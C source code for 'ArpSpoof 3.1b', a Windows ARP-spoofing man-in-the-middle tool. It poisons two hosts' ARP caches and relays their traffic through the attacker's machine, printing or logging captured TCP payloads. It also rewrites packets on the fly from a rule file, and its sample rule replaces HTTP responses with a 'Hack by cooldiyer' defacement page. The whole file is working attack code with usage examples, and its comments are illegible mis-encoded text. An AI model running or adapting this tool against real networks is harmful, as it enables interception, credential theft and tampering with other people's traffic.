#include <stdio.h>
#include <pcap.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wpcap.lib")

#include "iphlpapi.h"
#include "protoinfo.h"
#include "spoof.h"
#include "tcp.h"
#include "scan.h"
#include "replace.h"

//
// �洢Ҫ�滻���ַ���������ṹ
//

typedef struct tagSTRLINK
{
	char szOld[256];
	char szNew[256];
	struct tagSTRLINK *next;
}STRLINK, *PSTRLINK;

HANDLE hThread[2]; // ��������RARP�����߳�
unsigned short g_uPort; // Ҫ���ӵĶ˿ں�
pcap_t *adhandle; // �������
HANDLE g_hEvent; // ��׽ Ctrl+C
int g_uMode; // ��ƭ��־ 0 ��ʾ������ƭ�� 1��ʾ˫����ƭ
BOOL bIsReplace = FALSE; // �Ƿ��ת�������ݽ����滻
BOOL bIsLog = FALSE; // �Ƿ�������ݱ���
char szLogfile[MAX_PATH]; // Ҫ�������ݵ��ļ���

// ��ӦARPSPOOF�ṹ�еĳ�Ա
unsigned char ucSelf[6], ucIPA[6], ucIPB[6];
char szIPSelf[16], szIPA[16], szIPB[16], szIPGate[16];

// ��ʼ������
PSTRLINK strLink = (PSTRLINK) malloc(sizeof(STRLINK));

char TcpFlag[6]={ 'F','S','R','P','A','U' }; //����TCP��־λ���������ݰ�ʱ��

BOOL InitSpoof(char **);
void ResetSpoof();
void Help();

//
// ��ʽ��copy��������Ҫ��Ϊ���滻 '\r', '\n'�ַ�
//

BOOL fstrcpy(char *szSrc, char *szDst)
{
	unsigned int i, j;
	for (i = 0, j=0; i < strlen(szSrc); i++, j++)
	{
		if (szSrc[i] == '\\' && szSrc[i + 1] == 'r') // Replace "\r"
		{
			szDst[j] = '\r';
			i ++;
		}
		else if (szSrc[i] == '\\' && szSrc[i + 1] == 'n') // Replace "\n"
		{
			szDst[j] = '\n';
			i ++;
		}
		else if (szSrc[i] != '\n' && szSrc[i] != '\0')
		{
			szDst[j] = szSrc[i];
		}
		else
		{
			return TRUE;
		}
	}
	szDst[j + 1] = '\0'; // add '\0'
	return TRUE;
}
//
// ���ļ��еĹ���洢��������
// ��ڲ��� szJobfile ==> �����ļ���
// ���ڲ��� strLink   ==> ָ������ͷ��ָ��
//
BOOL ReadJob(char *szJobfile, PSTRLINK strLink)
{
	FILE *fp;
	char szBuff[256], *p = NULL;

	if ((fp = fopen(szJobfile, "rt")) == NULL)
	{
		printf("Job file open error\n");
		return FALSE;
	}

	PSTRLINK pTmp = strLink; // ����ԭָ��

	while (fgets(szBuff, sizeof(szBuff), fp))
	{
		if (strcmp(szBuff, "----"))
		{
			memset(szBuff, 0, sizeof(szBuff));
			memset(strLink->szOld, 0, sizeof(strLink->szOld));
			fgets(szBuff, sizeof(szBuff), fp);
	
			if (! fstrcpy(szBuff, strLink->szOld))
			{
				printf("[!] job file format error ..\n");
				return FALSE;
			}
			fgets(szBuff, sizeof(szBuff), fp);

			if (strcmp(szBuff, "----"))
			{
				memset(szBuff, 0, sizeof(szBuff));
				memset(strLink->szNew, 0, sizeof(strLink->szNew));
				fgets(szBuff, sizeof(szBuff), fp);
				if (! fstrcpy(szBuff, strLink->szNew))
				{
					printf("[!] job file format error ..\n");
					return FALSE;
				}
			}
			else
			{
				printf("Replace Job file format error, \
					used arpspoof /n release a new job file\n");
				return FALSE;
			}
			strLink->next = (PSTRLINK) malloc(sizeof(STRLINK));
			strLink = strLink->next;
			strLink->next = NULL;
		}
	}
	fclose(fp);
	strLink = pTmp; // �ָ�ԭָ��
	return TRUE;
}

//
// ������д���ļ�
// ��ڲ���: szLogfile ==> ��־�ļ��� data ==> ָ�����ݿ�Ŀ�ָ�� size ==> ���ݿ��С
// ����ֵ���� Boolean
//

BOOL SaveLog(char szLogfile[], const void *data, unsigned int size)
{
	HANDLE hFile;
	DWORD dwBytes;
	hFile = CreateFile(szLogfile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	WriteFile(hFile, data, size, &dwBytes, NULL);
	CloseHandle(hFile);
	return TRUE;
}

//
// �������̨�¼��ĺ���,��Ҫ�Ǵ�������ж�����
// 

BOOL CtrlHandler( DWORD fdwCtrlType ) 
{ 
	switch (fdwCtrlType) 
	{ 
	// Handle the CTRL-C signal. 
    case CTRL_C_EVENT: 
    case CTRL_CLOSE_EVENT: 
    case CTRL_BREAK_EVENT:  
    case CTRL_LOGOFF_EVENT: 
    case CTRL_SHUTDOWN_EVENT:
		ResetSpoof(); //  �ָ���ƭ������arp cache
		return TRUE;		
    default: 
		return FALSE;
	}
}

// 
//  Ϊ���ñ�����ֵ,��ʼ������
//
BOOL InitSpoof(char **argv)
{
	// IPSelf, ucSelf �Ѿ��ڴ�����ʱ��ʼ������
	memset(ucIPA, 0xff, 6);
	memset(ucIPB, 0xff, 6);
	memset(szIPA, 0 ,16);
	memset(szIPB, 0 ,16);
	
	if (!GetMac((char *) argv[1], ucIPA))
	{
		printf("[!] Error Get Mac Address of %s\n", argv[1]);
		return FALSE;
	}

	if (!GetMac((char *) argv[2], ucIPB))
	{
		printf("[!] Error Get Mac Address of %s\n", argv[2]);
		return FALSE;
	}

	strcpy((char *) szIPA, (char *) argv[1]);
	strcpy((char *) szIPB, (char *) argv[2]);
	StaticARP((unsigned char *) szIPA, ucIPA);
	StaticARP((unsigned char *) szIPB, ucIPB);
	g_uPort = atoi(argv[3]);
	g_uMode = atoi(argv[5]);
	return TRUE;
}

//
// ��ʾARP��ƭ��Ϣ (������)
// ���ӳ���Ϊ�˵ȴ��������ݣ���Ϊ��������һ��ARPSPOOF����
//

void SpoofInfo(PARPSPOOF arpspoof)
{
	/*
	printf("Spoof %s %s MAC %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
		arpspoof->szTarget, arpspoof->szIP, 
		arpspoof->ucPretendMAC[0], arpspoof->ucPretendMAC[1],
		arpspoof->ucPretendMAC[2], arpspoof->ucPretendMAC[3],
		arpspoof->ucPretendMAC[4], arpspoof->ucPretendMAC[5]
		);
	*/
	Sleep(100);
}

//
// ����ARP��ƭ���̣���ʼSpoof
//
void ARPSpoof()
{
	PARPSPOOF arpspoof = (PARPSPOOF) malloc(sizeof(ARPSPOOF));
	arpspoof->adhandle = adhandle;
	memcpy(arpspoof->ucSelfMAC, ucSelf, 6);

	// Spoof IP1 -> IP2
	strcpy((char *) arpspoof->szTarget, szIPA);
	memcpy(arpspoof->ucTargetMAC, ucIPA, 6);
	strcpy((char *) arpspoof->szIP, szIPB);
	memcpy(arpspoof->ucIPMAC, ucIPB, 6);
	memcpy(arpspoof->ucPretendMAC, ucSelf, 6);
	hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
		(LPVOID) arpspoof, NULL, NULL);
	SpoofInfo(arpspoof);

	if (g_uMode == 1) // ���˫����ƭ
	{
		// Spoof IP2 -> IP1
		strcpy((char *) arpspoof->szTarget, szIPB);
		memcpy(arpspoof->ucTargetMAC, ucIPB, 6);
		strcpy((char *) arpspoof->szIP, szIPA);
		memcpy(arpspoof->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof->ucPretendMAC, ucSelf, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
			(LPVOID) arpspoof, NULL, NULL);
		SpoofInfo(arpspoof);
	}
}

//
// ����ARP��ƭ���ָ���ƭ������ARP cache
//     ��ARPSpoof���෴����
//
void ResetSpoof()
{
	printf("[+] Reseting .....\n");

	TerminateThread(hThread[0], 0);	
	TerminateThread(hThread[1], 0);

	PARPSPOOF arpspoof = (PARPSPOOF) malloc(sizeof(ARPSPOOF));

	arpspoof->adhandle = adhandle;
	strcpy((char *) arpspoof->szTarget, szIPA);
	memcpy(arpspoof->ucTargetMAC, ucIPA, 6);
	strcpy((char *) arpspoof->szIP, szIPB);
	memcpy(arpspoof->ucIPMAC, ucIPB, 6);
	memcpy(arpspoof->ucPretendMAC, ucIPB, 6);
	memcpy(arpspoof->ucSelfMAC, ucSelf, 6);
	hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
		(LPVOID) arpspoof, NULL, NULL);
	if(g_uMode == 1)
	{
		Sleep(200);
		strcpy((char *) arpspoof->szTarget, szIPB);
		memcpy(arpspoof->ucTargetMAC, ucIPB, 6);
		strcpy((char *) arpspoof->szIP, szIPA);
		memcpy(arpspoof->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof->ucPretendMAC, ucIPA, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
			(LPVOID) arpspoof, NULL, NULL);
	}

	printf("[-] Sleep 5s ");
	for(int i = 0; i < 12; i++, Sleep(300))
			printf(".");
	printf("\n");
	TerminateThread(hThread[0], 0);	
	TerminateThread(hThread[1], 0);

	// pcap_breakloop�����ж������Ĳ�������ʹ�ó�����ֹ���м�
	pcap_breakloop(adhandle); 
}

//
// �滻���ݰ�������, ���¼���У���
//
void ReplacePacket(const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;

	eh = (ETHeader *) pkt_data;
	ih = (IPHeader *) (pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;
	th = (TCPHeader *) ((u_char*)ih + ip_len);

	// �õ�TCP���ݰ���ָ��ͳ���
	unsigned char *datatcp = (unsigned char *) ih + sizeof(_IPHeader) 
		+ sizeof(struct _TCPHeader);
	int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));

	// ��ʼ�滻��������,���¼���У���
	PSTRLINK pTmp = strLink;
	int i = 0;
	while (pTmp->next)
	{
		// ��ʼƥ���������滻
		if (Replace(datatcp, lentcp, pTmp->szOld, pTmp->szNew))
		{
			printf("    Applying rul %s ==> %s\n", pTmp->szOld, pTmp->szNew);
			i ++;
		}
		pTmp = pTmp->next;
	}
	if (i >0) // ������ݰ����޸ģ����¼���У���
	{
		printf("[*] Done %d replacements, forwarding packet of size %d\n",
			i, pkt_len);
		ih->ipChecksum = 0;
		th->checksum = 0;
		ih->ipChecksum = checksum((USHORT *)ih, sizeof(_IPHeader));
		ComputeTcpPseudoHeaderChecksum(ih, th, (char *)datatcp, lentcp);
	}
	else
		printf("[*] Forwarding untouched packet of size %d\n", pkt_len);

}

//
// ������ʾ���ݰ����ݣ����߱������ļ�
//

void AnalyzePacket(const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;
	char szSource[16],szDest[16];
    u_short sport, dport;

	eh = (ETHeader *) pkt_data;
	ih = (IPHeader *) (pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;
	th = (TCPHeader *) ((u_char*)ih + ip_len);

	sport = ntohs(th->sourcePort);
	dport = ntohs(th->destinationPort );

	unsigned char *datatcp = (unsigned char *) ih + sizeof(_IPHeader) 
		+ sizeof(struct _TCPHeader);
	int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));

	wsprintf(szSource, "%d.%d.%d.%d",
		ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);

	wsprintf(szDest, "%d.%d.%d.%d",
		ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

	// �������ݰ�
	char szTmpStr[85], szTmpFlag[7];
	szTmpFlag[6] = '\0';

	unsigned char FlagMask = 1;
	for(int i=0; i<6; i++ )
	{
		if ((th->flags) & FlagMask)
			szTmpFlag[i] = TcpFlag[i]; 
		else
			szTmpFlag[i] = '-';
		FlagMask = FlagMask << 1; 
	}
	wsprintf(szTmpStr,
		"\nTCP %15s->%-15s Bytes=%-4d TTL=%-3d Port:%d->%d %s\n",
		szSource, szDest, lentcp, ih->ipTTL, sport, dport, szTmpFlag);
	printf("%s", szTmpStr);

	if (bIsLog) // д���ļ�
	{
		SaveLog(szLogfile, szTmpStr, strlen(szTmpStr));
		SaveLog(szLogfile, datatcp, lentcp);
	}

	//  ��ʾ���ݰ�������
	for (i = 0; i < lentcp; i++)
	{
		if ((*(datatcp+i) & 0x000000ff) != 0x07)  // ���˵��ɶ��Beep�ַ�
			printf("%c", *(datatcp+i));
	}
}

//
//  ����ת�����޸ġ��������ݰ�������
//  ����ĺ��Ĳ���
//
void ForwardPacket(pcap_t *adhandle, const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;
	char szSource[16],szDest[16];
    u_short sport, dport;

	eh = (ETHeader *) pkt_data;

	if(eh->type != htons(ETHERTYPE_IP))
		return; // ֻת��IP��

	ih = (IPHeader *) (pkt_data + 14); //�ҵ�IPͷ��λ��,14Ϊ��̫ͷ�ĳ���
	ip_len = (ih->iphVerLen & 0xf) * 4; 
	th = (TCPHeader *) ((u_char*)ih + ip_len); // �ҵ�TCP��λ��

	// ���˿���Ϣ��������ת��Ϊ����˳��
	sport = ntohs(th->sourcePort);
	dport = ntohs(th->destinationPort );

	// �õ�ԴIP��ַ��Ŀ��IP��ַ
	wsprintf(szSource, "%d.%d.%d.%d",
		ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);
	wsprintf(szDest, "%d.%d.%d.%d",
		ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

	// ��ʼ����Ҫת�������ݰ�
	if (strcmp(szDest, szIPSelf) != 0 && memcmp(ucSelf, eh->dhost,6) == 0)
	{
		// rebuild IPA -> IPB
		if (memcmp(eh->shost, ucIPA, 6) == 0)
		{
			// �޸���̫��ͷ
			memcpy(eh->shost, eh->dhost, 6);
			memcpy(eh->dhost, ucIPB, 6);

			if (ih->ipProtocol == PROTO_TCP && dport == g_uPort)
			{

				if (bIsReplace) // �Ƿ��滻
				{
					printf("[+] Caught %15s:%-4d -> %s:%d\n", szSource,	sport, szDest, dport);
					ReplacePacket(pkt_data, pkt_len);
					printf("[*] Forwarding untouched packet of size %d\n", pkt_len);
				}
				else
				{
					AnalyzePacket(pkt_data, pkt_len);
				}
			}
			if (pcap_sendpacket(adhandle, (const unsigned char *) pkt_data, pkt_len) < 0)
			{
				printf("[!] Forward thread send packet error\n");
			}
		}
		// rebuild IPB -> IPA
		else if (memcmp(eh->shost, ucIPB, 6) == 0)
		{
			memcpy(eh->shost, eh->dhost, 6);
			memcpy(eh->dhost, ucIPA, 6);

			if (ih->ipProtocol == PROTO_TCP && sport == g_uPort)
			{
				if (bIsReplace)
				{
					printf("[+] Caught %15s:%-4d -> %s:%d\n", szSource,	sport, szDest, dport);
					ReplacePacket(pkt_data, pkt_len);
					printf("[*] Forwarding untouched packet of size %d\n", pkt_len);
				}
				else
				{
					AnalyzePacket(pkt_data, pkt_len);
				}
			}
			if(pcap_sendpacket(adhandle, (const unsigned char *) pkt_data, pkt_len) < 0)
			{
				printf("[!] Forward thread send packet error\n");
			}
		}
	}
}

//
// pcap_loop�Ļص�����
// �ѽ��յ������ݴ���ForwardPacket��������
//
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
	ForwardPacket(adhandle, pkt_data,header->len);
}

//
// �ͷ�һ��ʵ�������ļ�
//

int ReleaseJob(const char *szName)
{
	FILE *fp;
	if ((fp = fopen("job.txt","w")) == NULL)
		return 0;
	fputs("----\nHTTP/1.\n----\nHTTP/1.1 200 OK\\r\\n" \
		"Server: CoolDiyer's Hack IIS\\r\\nContent-Length: 27\\r\\n" \
		"Connection: close\\r\\nContent-Type: text/html\\r\\n\\r\\n" \
		"Hack by cooldiyer<noframes>\n----", fp);
	fclose(fp);
	return 1;
}

//
// ����������Ҫ��������ĳ�ʼ��
//
int main(int argc, char *argv[])
{
	printf("ARPSpoof Ver 3.1b by CoolDiyer\n");

	if (argc >1)
	{
		if (argv[1][1] == 'l') // �г����õ�����
		{
			ListAdapters();
			return 0;
		}

		if (argv[1][1] == 'n') // �ͷ�һ��ʾ�������ļ� job.txt
		{
			if (ReleaseJob("job.txt"))
			{
				printf("[+] Replace Job file job.txt release success...\n");
				return 0;		
			}
			else
			{
				printf("[!] Release job file error\n");
				return -1;
			}
		}

		if (argc == 4 && argv[1][1] == 's')
		{
			EnumLanHost(argv[2], argv[3]);
			return 0;
		}
	}

	if (argc < 6) // ��������ȷ����ʾʹ�ð���
	{
		Help();
		return 0;
	}

	// ����������ʼ��szIPSelf, ucSelf, szIPGate����
	if ((adhandle = OpenAdapter(atoi(argv[4]), szIPSelf, ucSelf, szIPGate)) == NULL)
	{
		printf("[!] Open adatper error!\n");
		return FALSE;
	}

	// ��ʼ������������ת���������
	if (InitSpoof(argv))
	{
		if (argc == 7 && strcmpi(argv[6], "/reset") == 0) // ���ûָ��̣߳�5����˳�����
		{
			if (g_uMode == 1)
				printf("[*] Reset  %s <-> %s\n", szIPA ,szIPB);
			else
				printf("[*] Reset  %s --> %s\n", szIPA ,szIPB);
			ResetSpoof();
		}
		else if (argc >5 )
		{
			SetConsoleCtrlHandler((PHANDLER_ROUTINE) CtrlHandler, TRUE);
			if (argc == 8 && argv[6][1] == 'r') // �����Ҫ�滻ת������
			{
				if (ReadJob(argv[7], strLink)) // ���ع����ļ�,����ʾ�滻����
				{
					PSTRLINK pTmp = strLink;
					int i=0;
					while (pTmp->next)
					{
						i++;
						printf("[*] Parsing rul %s ==> %s\n", pTmp->szOld, pTmp->szNew);
						pTmp = pTmp->next;
					}
					bIsReplace = TRUE;
					printf("[+] Loaded %d rules...\n", i);
				}
				else
					return -1;

			}
			if (argc == 8 && argv[6][1] == 's') //  �Ƿ񱣴����ݵ��ļ�
			{
				strcpy(szLogfile, argv[7]);
				bIsLog = TRUE;
				printf("[+] Save log to %s\n", szLogfile);
			}

			if (g_uMode == 1) //  ˫����ƭ
				printf("[*] Spoofing  %s <-> %s\n", szIPA ,szIPB);
			else // ������ƭ
				printf("[*] Spoofing  %s --> %s\n", szIPA ,szIPB);

			if (!bIsReplace) // ֻת�������滻
				printf("[+] Using fixed forwarding thread.\n");

			// ��ʼ��Ҫ���̣���ƭ��ת���������ݰ�
			ARPSpoof();
			pcap_loop(adhandle, 0, packet_handler, NULL);
		}
	}

	pcap_close(adhandle);
	return 0;
}

//
// ������������һЩ������˵���ͳ����ʹ��
//
void Help()
{
	printf("Usage:\n");
	printf("  ArpSpoof <IP1> <IP2> <PORT> <AdpNum> <Mode> /[r|s] <File>\n");
	printf("  ArpSpoof /s <IP> <Mask>\n");
	printf("  ArpSpoof /l\n");
	printf("\tMode Options:\n\t\t0\tIP1 --> IP2\n");
	printf("\t\t1\tIP1 <-> IP2\n");
	printf("Examples:\n");
	printf("\t> ArpSpoof 192.168.0.1 192.168.0.8 80 2 1 /r job.txt\n");
	printf("\t  # Spoof 192.168.0.1 <-> 192.168.0.8:80 with rule\n\n");
	printf("\t> ArpSpoof 192.168.0.1 192.168.0.8 21 2 1 /s sniff.log\n");
	printf("\t  # Spoof 192.168.0.1 <-> 192.168.0.8:80 save to log\n\n");
	printf("\t> ArpSpoof 192.168.0.1 192.168.0.8 80 2 0 /RESET\n");
	printf("\t  # Reset 192.168.0.1 --> 192.168.0.8:80\n\n");
	printf("\t> ArpSpoof /s 192.168.0.1 255.255.255.0\n");
	printf("\t  # Scan lan host\n\n");
	printf("\t> ArpSpoof /l\n");
	printf("\t  # Lists adapters\n\n");
	printf("\t> ArpSpoof /n\n");
	printf("\t  # Release a new replace rule file\n");
}
